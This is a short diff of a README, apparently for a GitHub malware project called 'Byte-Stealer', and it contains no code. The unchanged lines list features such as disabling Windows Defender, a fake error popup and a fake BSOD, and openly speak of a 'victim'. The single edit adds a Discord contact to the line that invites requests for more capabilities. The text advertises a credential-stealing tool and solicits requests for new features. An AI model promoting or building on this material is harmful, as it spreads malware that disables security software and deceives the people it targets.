@@ -23,7 +23,7 @@
 • Disable windows defender 
 • Fake error popup
 • fake BSOD;) if u really want it(not recommended as victim will know something is wrong)
-• anything else (request in issues)
+• anything else (request in issues or msg me on discord)
 ```
 
 [![Star on GitHub](https://img.shields.io/github/stars/TurtlesXD/Byte-Stealer.svg?style=social)](https://github.com/TurtlesXD/Byte-Stealer/stargazers)
